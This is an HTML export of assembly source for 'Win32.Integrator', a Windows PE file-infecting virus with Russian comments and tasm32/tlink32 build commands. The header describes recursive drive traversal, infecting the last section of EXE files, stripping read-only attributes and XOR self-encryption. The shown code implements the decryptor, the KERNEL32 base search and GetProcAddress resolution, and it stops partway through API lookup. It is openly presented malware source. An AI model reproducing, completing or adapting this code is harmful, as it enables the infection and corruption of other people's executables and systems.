<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                            &lt;&lt;Win32.Integrator&gt;&gt;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">; Версия 1.1 (Продолжение линии Win9x.Integrator 1.3)</span><span class="sc0">
</span><span class="sc1">; ───────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;   Нерезидентный PE EXE инфектор.</span><span class="sc0">
</span><span class="sc1">; - Устанавливает свой SEH;</span><span class="sc0">
</span><span class="sc1">; - Производит поиск ImageBase KERNEL32.DLL в памяти;</span><span class="sc0">
</span><span class="sc1">;   + Видоизменен и модифицирован поиск.</span><span class="sc0">
</span><span class="sc1">; - Рекурсивно обходит текущий диск, примерно через три секунды работы</span><span class="sc0">
</span><span class="sc1">;   сохраняет текущий путь в WIN.INI и передает управление носителю, при</span><span class="sc0">
</span><span class="sc1">;   следующем запуске зараженного файла считывает сохраненный путь и</span><span class="sc0">
</span><span class="sc1">;   производит дальнейщий поиск начиная с сохраненного пути;</span><span class="sc0">
</span><span class="sc1">; - Снимает ReadOnly атрибуты файла;</span><span class="sc0">
</span><span class="sc1">; - Заражает в последнюю секцию, ставит ей R/W/E/I атрибуты;</span><span class="sc0">
</span><span class="sc1">; - Не заражает: - файлы с оверлеями;</span><span class="sc0">
</span><span class="sc1">;                - файлы, в которых физический или виртуальный размеры кода</span><span class="sc0">
</span><span class="sc1">;                  равны нулю;</span><span class="sc0">
</span><span class="sc1">;                - файлы, в которых физический размер кода больше</span><span class="sc0">
</span><span class="sc1">;                  виртуального;</span><span class="sc0">
</span><span class="sc1">;                - файлы с атрибутом DLL;</span><span class="sc0">
</span><span class="sc1">;                + файлы с SubSystem = 1 (Native)</span><span class="sc0">
</span><span class="sc1">;                + файлы, у которых точка входа не в первой секции</span><span class="sc0">
</span><span class="sc1">; - Шифрован по XOR с плавающим ключом;</span><span class="sc0">
</span><span class="sc1">; - Модифицирован процесс генерации нового ключа для совместимости с WinNT.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 10.2.01                                           (C) Gobleen Warrior//SMF</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">; tasm32 /ml /m integrator.asm</span><span class="sc0">
</span><span class="sc1">; tlink32 /Tpe /ap /c /x integrator.obj,,,import32.lib</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">; People can fly... Everything can happen...</span><span class="sc0">

</span><span class="sc5">DOEXE</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; 1 - ищет *.gwi файлы, 0 - *.exe</span><span class="sc0">
</span><span class="sc5">PROCDIR</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; 1 - текущий каталог, 0 - рекурсия</span><span class="sc0">

                        </span><span class="sc2">.386p</span><span class="sc0">
                        </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc1">; Объявляем необходимые для работы ЯКОБЫ носителя ф-ции API</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">                   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">                   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

                        </span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc1">;╔══════════════════════════════════════════════════════════════════════════╗</span><span class="sc0">
</span><span class="sc1">;║ Пошел вирусный код                                                       ║</span><span class="sc0">
</span><span class="sc1">;╚══════════════════════════════════════════════════════════════════════════╝</span><span class="sc0">
</span><span class="sc5">virstart</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc1">; Получим дельту</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">; Расшифруем тело</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cryptstart</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cryptlen</span><span class="sc0">
</span><span class="sc5">uncryptor</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">034h</span><span class="sc0"> </span><span class="sc1">; XOR AL</span><span class="sc0">
</span><span class="sc5">key</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; число</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">uncryptor</span><span class="sc0">
</span><span class="sc5">cryptstart</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; Сохраним старую точку входа</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_ip</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">temp_ip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; Установим новый SEH</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_seh</span><span class="sc0">
</span><span class="sc1">; Сюда мы будем возвращаться в случае ошибки. Восстановим старый стэк (он</span><span class="sc0">
</span><span class="sc1">; находится в ESP+8)</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ret_to_file</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">; Передаем управление оригинальному файлу</span><span class="sc0">
                        </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">original_ip</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">hoststart</span><span class="sc0">
</span><span class="sc1">; Установим таки новый SEH</span><span class="sc0">
</span><span class="sc1">; При загрузке файла fs:[0] кажит на структуру, содержащую адрес SEH</span><span class="sc0">
</span><span class="sc5">set_seh</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">locate_kernel</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ret_to_file</span><span class="sc0">

</span><span class="sc5">locate_kernel</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">; Находит и проверяет на истинность image_base Kernel32 в памяти :))))</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc1">; Адрес начала вирусного кода</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; Обнулим младшее слово</span><span class="sc0">
</span><span class="sc5">is_it_exe</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">; EAX = imagebase начала PE</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_mz</span><span class="sc0">
</span><span class="sc5">not_kernel</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0"> </span><span class="sc1">; минус страница</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">is_it_exe</span><span class="sc0">
</span><span class="sc5">found_mz</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0"> </span><span class="sc1">; на всякий случай</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_kernel</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">080h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; = RVA 1ого каталога импорта</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; + ImageBase = VA оного</span><span class="sc0">
</span><span class="sc5">next_imp_catalog</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; = RVA ASCII имени</span><span class="sc0">
                                                     </span><span class="sc1">; экспортера функции</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; + ImageBase = VA оного</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05fdfdfffh</span><span class="sc0"> </span><span class="sc1">; Приведем к верхнему регистру</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0"> </span><span class="sc1">; Kernel32.dll?</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">kernel_directory</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">next_imp_catalog</span><span class="sc0">
</span><span class="sc5">kernel_directory</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; RVA Таблицы адресов импорта</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; VA оной</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; VA некоей функции, указывает</span><span class="sc0">
                                       </span><span class="sc1">; куда-то внутрь KERNEL32.DLL.</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Обнулим младшую часть адреса, она</span><span class="sc0">
                                       </span><span class="sc1">; не нужна - кернел загружается с</span><span class="sc0">
                                       </span><span class="sc1">; адреса, кратного 1 сегменту</span><span class="sc0">
                                       </span><span class="sc1">; (10000h байт).</span><span class="sc0">
</span><span class="sc5">test_kernel</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">kernel_founded</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0"> </span><span class="sc1">; Минус сегмент</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">test_kernel</span><span class="sc0">
</span><span class="sc5">kernel_founded</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; RVA PE заголовка</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; VA оного (EAX = ImageBase кернела)</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">locate_getprocadress</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">temp_ip</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_ip</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">locate_getprocadress</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">; Определяет адрес GetProcAdress API</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">078h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; RVA таблицы</span><span class="sc0">
                                                        </span><span class="sc1">; экспортов</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; VA таблицы экспортов</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Обнулим счетчик имен</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Шоб первый раз был ноль</span><span class="sc0">
</span><span class="sc5">search4</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Увеличим счетчик</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Сравним счетчик</span><span class="sc0">
                        </span><span class="sc1">; проверенных имен с их общим количеством в наличии</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">no_getprocadress</span><span class="sc0"> </span><span class="sc1">; Если больше - на выход</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">020h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; RVA таблицы указателей на</span><span class="sc0">
                                            </span><span class="sc1">; имена API</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; VA адрес таблицы оной</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; RVA API номер EDI</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; VA оной API</span><span class="sc0">
</span><span class="sc1">; Сравним очередное имя с GetProcAdress</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'PteG'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'Acor'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">search4</span><span class="sc0">
</span><span class="sc1">; Совпало. Мы нашли нужную нам API</span><span class="sc0">
</span><span class="sc1">; EDI = индекс оной API в таблице имен и в таблице ординалов</span><span class="sc0">
</span><span class="sc1">; Получим адрес ординала данной функции. Для этого умножим индекс на 2,</span><span class="sc0">
</span><span class="sc1">; прибавим RVA таблицы ординалов и imagebase Kernel32.</span><span class="sc0">
</span><span class="sc1">; или:</span><span class="sc0">
</span><span class="sc1">; EDI*2+RVA_Table_ordins+ImageBase = Ordinal</span><span class="sc0">
</span><span class="sc1">; После этого умножив ординал на 4 и прибавив RVA таблицы адресов API мы</span><span class="sc0">
</span><span class="sc1">; получим RVA адреса API. Прибавим Kernel32 ImageBase и получим VA API.</span><span class="sc0">
</span><span class="sc1">; или:</span><span class="sc0">
</span><span class="sc1">; Ordinal*4+RVA_AdressTable+ImageBase = RVA_ProcAdress</span><span class="sc0">
</span><span class="sc1">; RVA_ProcAdress+ImageBase = VA API GertProcAdress</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; индекс API * 2</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">024h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; + RVA_Table_ordins</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; + Kernel32 ImageBase = Ordinal</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EDX = Ordinal</span><span class="sc0">
                        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Ordinal*4</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">01ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; + RVA AdressTable</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; + Kernel32 ImageBase = RVA API</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; + Kernel32 ImageBase = VA API</span><span class="sc0">
</span><span class="sc1">; Получили адрес данной API. Сохраним его.</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourGetProcAdress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">locate_all_apis</span><span class="sc0">
</span><span class="sc5">no_getprocadress</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">locate_all_apis</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">; Заполняет таблицу адресов необходимых нам API</span><span class="sc0">
</span><span class="sc1">; Вызов GetProcAdress:</span><span class="sc0">
</span><span class="sc1">;               push offset &lt;имя функции&gt;</span><span class="sc0">
</span><span class="sc1">;               push imagebase</span><span class="sc0">
</span><span class="sc1">;               call GetProcAdress</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">getFindFirstFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourFindFirstFileA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Kernel32 ImageBase</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">search4apis</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Kernel32 ImageBase</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourGetProcAdress</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
